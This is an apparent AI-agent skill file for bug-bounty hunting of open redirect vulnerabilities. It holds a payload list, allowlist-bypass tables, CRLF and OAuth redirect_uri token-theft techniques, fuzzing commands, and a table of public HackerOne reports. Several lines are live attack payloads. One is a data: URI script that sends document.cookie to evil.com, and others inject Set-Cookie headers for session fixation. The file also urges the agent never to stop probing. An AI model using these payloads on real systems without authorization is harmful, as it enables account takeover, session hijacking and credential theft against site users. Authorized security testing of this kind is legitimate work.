---
name: hunt-open-redirect
description: "Use this skill when you see redirect/next/url/return/goto/dest/destination/redir/r/u/callback/returnTo/continue/forward parameters in URLs or POST bodies, when OAuth flows expose redirect_uri, or when login/logout/signup pages take a post-action URL. Load automatically when any 3xx response contains a Location header derived from user input, when SSO/OAuth/OpenID callbacks are reachable, or when JS performs window.location = userInput. Only invoke if real impact potential exists (OAuth token theft, credential phishing, SSRF chain, ATO). Skip theoretical findings (no-context redirect to attacker domain on a marketing page is NOT a finding without chain)."
type: hunt
---

# Hunt: Open Redirect

## Crown Jewel Targets
- **OAuth redirect_uri abuse** — steal `code` / `access_token` from `/oauth/authorize?redirect_uri=`, chain to full account takeover (Critical, $1k-$10k)
- **SSO callback hijack** — SAML `RelayState`, OIDC `redirect_uri`, redirect after auth = session/code leak via Referer
- **Password reset → phishing** — reset link redirects to attacker page that mimics login, captures new password
- **Mobile deep-link redirect** — `myapp://oauth?redirect=https://evil` lands token in attacker's hands
- **Server-side redirect with credentials** — `Location:` with Authorization header forwarded
- **Open redirect → SSRF** — internal service follows 302, hits 169.254.169.254 metadata
- **CRLF in redirect param** — `?next=/path%0d%0aSet-Cookie:%20session=attacker` = session fixation

## Detection Signals
- Parameter names: `redirect`, `redirect_uri`, `redirect_url`, `next`, `url`, `return`, `returnTo`, `return_url`, `goto`, `dest`, `destination`, `redir`, `r`, `u`, `target`, `callback`, `continue`, `forward`, `back`, `link`, `out`, `to`, `from`, `success_url`, `failure_url`, `cancel_url`
- HTTP responses: `Location: <user-controlled>`, `HTTP/1.1 30[1278]`
- HTML/JS sinks: `window.location = `, `location.href = `, `location.replace(`, `<meta http-equiv="refresh" content="0;url=`, `document.location = `
- Headers: `Referer:` containing target → indicates redirect chain worth investigating
- OAuth endpoints: `/oauth/authorize`, `/oauth/callback`, `/auth/google`, `/saml/login`, `/sso`

## Attack Techniques
1. **Classic external redirect** — replace value with `https://evil.com`, follow with `-L`, check final Location header points off-domain.
2. **Protocol-relative URL** — `//evil.com` and `//evil.com/path` bypass naive `startsWith("/")` checks because browser treats `//` as scheme-relative.
3. **Backslash trick** — `/\evil.com`, `\/\/evil.com`, `/\/evil.com` — browsers normalize backslash to forward slash, server-side check sees relative path.
4. **Userinfo URL** — `https://target.com@evil.com` — server parses `target.com` as username, browser navigates to `evil.com`. Devastating against URL-allowlist regex.
5. **Whitelist confusion** — `evil.com/target.com`, `target.com.evil.com`, `evil.com?target.com`, `evil.com#target.com`, `evil.com\@target.com`.
6. **Path traversal in redirect** — `/login?next=/..//evil.com` or `/redirect?url=//evil.com/../../path`.
7. **CRLF injection** — `?next=/path%0d%0aLocation:%20https://evil.com` or `%0d%0aSet-Cookie:%20session=attacker` for session fixation.
8. **OAuth redirect_uri partial match** — register `https://target.com.evil.com/cb` when server checks `startsWith("https://target.com")`. Steal `code=` from query/fragment.
9. **OAuth path traversal** — `redirect_uri=https://target.com/oauth/cb/../../../evil` if path is not normalized.
10. **javascript: / data: scheme** — `javascript:alert(document.domain)` for stored open-redirect → XSS upgrade. `data:text/html,<script>...` similar.
11. **Unicode / IDN homograph** — `https://tаrget.com` (Cyrillic а U+0430), `xn--trget-9wa.com`, fullwidth `．` (U+FF0E).
12. **Double-encoding** — `%2f%2fevil.com`, `%252f%252fevil.com`, `%25%32%66%25%32%66evil.com`.

## Payloads
```
//evil.com
//evil.com/
/\evil.com
\/\/evil.com
/\/evil.com
//evil.com/%2e%2e
https://evil.com
https:evil.com
https:/\/\evil.com
//google.com/%2f..
//evil.com#.target.com
//evil.com?.target.com
//evil.com\@target.com
//target.com@evil.com
https://target.com@evil.com
https://target.com.evil.com
https://evil.com/target.com
https://evil.com#@target.com
//target%E3%80%82evil.com
//target%252ecom%252eevil.com
javascript:alert(document.domain)
javascript://target.com/%0aalert(1)
data:text/html,<script>document.location='https://evil.com/?c='+document.cookie</script>
//xn--google-yri.com  # IDN homograph
%0d%0aLocation:%20https://evil.com
/%0d%0aSet-Cookie:%20sess=evil
//;@evil.com
//evil%E3%80%82com
```

OAuth-specific:
```
?redirect_uri=https://target.com.evil.com/cb&response_type=code&client_id=...
?redirect_uri=https://target.com@evil.com/cb
?redirect_uri=https://target.com/cb/../../../evil/cb
?redirect_uri=https://target.com#@evil.com
?redirect_uri=https%3A%2F%2Fevil.com%2F%3F.target.com
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Must start with `/` | `/\evil.com`, `//evil.com`, `/\/evil.com` |
| Must start with `https://target.com` | `https://target.com.evil.com`, `https://target.com@evil.com`, `https://target.com%2eevil.com` |
| Regex `^https?://target\.com` | URL fragment: `https://target.com#@evil.com`, userinfo: `https://target.com@evil.com` |
| Blacklist `evil.com` | URL-encode: `e%76il.com`, IDN: `xn--evil-...`, IP: `0x7f000001`, decimal `2130706433` |
| Strips `//` | `/\\evil.com`, `\/\/evil.com`, triple-slash `///evil.com` |
| Validates host parse | Userinfo trick `target.com@evil.com` |
| Blocks `javascript:` | `Javascript:`, `java%0ascript:`, `java\tscript:` |
| Removes external schemes | `\\evil.com` (Windows UNC), `vbscript:` |

## Tools
```bash
# Detect open redirects across a target
gau target.com | gf redirect | qsreplace 'https://evil.com' | httpx -fr -mr 'evil.com'

# Manual probe
curl -sI -L "https://target.com/login?next=//evil.com" | grep -i location

# OAuth redirect_uri fuzzing
ffuf -u 'https://target.com/oauth/authorize?client_id=X&redirect_uri=FUZZ' \
  -w redirect-payloads.txt -mr 'Location:.*evil'

# OpenRedireX
openredirex -l urls.txt -p payloads.txt -k 'FUZZ' -c 50

# kxss for reflected redirect parameters
echo target.com | gau | kxss | grep -iE 'redirect|url|next'
```

## Impact
- **Critical**: OAuth code/token theft → full ATO; CRLF → session fixation → ATO
- **High**: SAML RelayState abuse leading to session hijack; password-reset phishing chain with stored XSS
- **Medium**: Phishing-grade open redirect with `target.com`-rooted URL displayed in mail clients (Office365, Slack unfurl trust)
- **Low / N/A**: Plain redirect to attacker domain with NO chain — most programs reject. Always chain.

## Chain Potential
- **+ OAuth** = `redirect_uri` token theft → ATO (use `hunt-oauth` skill)
- **+ XSS** = `javascript:` payload becomes stored XSS in profile/email link
- **+ SSRF** = internal HTTP client follows 30x to `169.254.169.254` or internal Redis
- **+ CRLF** = header/cookie injection, cache poisoning
- **+ Cookie scoping** = combined with subdomain takeover to set parent-domain cookies
- **+ Postmessage** = redirect into attacker page that postMessages back to target window
- **+ CSP bypass** = redirect-based exfil from CSP-strict page (`<meta refresh>` to attacker)
- **+ Password reset** = host header injection + open redirect = token capture

## Fallback Chain
1. If the parameter validates the host strictly, try userinfo trick `https://target.com@evil.com` and backslash/IDN/double-encode bypasses before giving up.
2. If straight redirect blocked, check OAuth/SSO endpoints — `redirect_uri` is usually validated separately and weaker. Test partial match, path traversal, fragment injection.
3. If server-side rejects, hunt client-side sinks (`window.location = qs.next`) — DOM-based open redirect is identical impact, often unfiltered.
4. Pivot to CRLF injection on the same parameter (`%0d%0a`) — even if redirect is sanitized, header injection may persist. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **Open Redirect Leads to Account Takeover** | CS Money | $0 | H1 #905607 |
| XSS and Open Redirect on MoPub Login | X / xAI | $1,540 | H1 #683298 |
| Open Redirect in secure.showmax.com | Showmax | $550 | H1 #749338 |
| Open redirect at inventory.upserve.com/http://google.com/ | Upserve | $1,200 | H1 #469803 |
| Open Redirect in Logout & Login | Expedia | $1,000 | H1 #1788006 |
| Open redirect on Brave QR scanner | Brave Software | $0 | H1 #1946534 |
| **Open Redirect on central.uber.com → ATO** | Uber | $0 | H1 #206591 |
| CRLF to XSS & Open Redirection | TikTok | $0 | H1 #2012519 |
| Twitter lite Android: local file steal, JS injection, redirect | X / xAI | $0 | H1 #499348 |
| Open redirect vulnerability | Rockstar Games | $250 | H1 #380760 |
| Open Redirect | Affirm | $250 | H1 #1213580 |
| dev.twitter.com XSS and Open Redirect | X / xAI | $1,120 | H1 #260744 |
| Open redirected by host header | Localize | $0 | H1 #2828499 |
| Chained open redirects + Ideographic Full Stop bypass | X / xAI | $560 | H1 #1032610 |
| Reflected XSS & Open Redirect at mcs main domain | Mail.ru | $0 | H1 #996262 |
| Bypass on lovable.dev via /..// path traversal in redirect | Lovable | $0 | H1 #3599248 |
| **Open Redirect in OAuth Flow → Phishing/Token Theft** | Lichess | $0 | H1 #3099816 |
| Open redirect using theme install | Shopify | $0 | H1 #101962 |

**PROVEN patterns** (3+ reports): OAuth redirect_uri parameter open redirect → auth code theft → ATO, login/logout `?next=` parameter trusted blindly, host-header based redirect, path-traversal bypass of allowlists (`/..//attacker.com`), XSS via `javascript:` protocol in redirect parameter.

## High-Value Chains (from Reports)

1. **OAuth `redirect_uri` open redirect → authorization code exfil → ATO**
   - Uber central.uber.com (H1 #206591) — open redirect on parameter used as OAuth callback; victim's code sent to attacker domain → full ATO.
2. **Login `next=` parameter → token sent to attacker via fragment**
   - CS Money (H1 #905607) — login page redirected to attacker site after auth carrying token in URL fragment → ATO.
3. **XSS via redirect protocol (javascript:) → session theft**
   - X / xAI MoPub (H1 #683298, $1,540) — `redirect=javascript:alert(document.cookie)` accepted by validator, full XSS.
4. **Allowlist bypass via path traversal in redirect param**
   - Lovable.dev (H1 #3599248) — `/..//attacker.com` defeated regex check; redirected externally.
5. **CRLF in redirect → response splitting → cache poison / XSS**
   - TikTok (H1 #2012519) — `%0d%0a` in redirect param injected headers and HTML, chained to stored XSS via cached response.
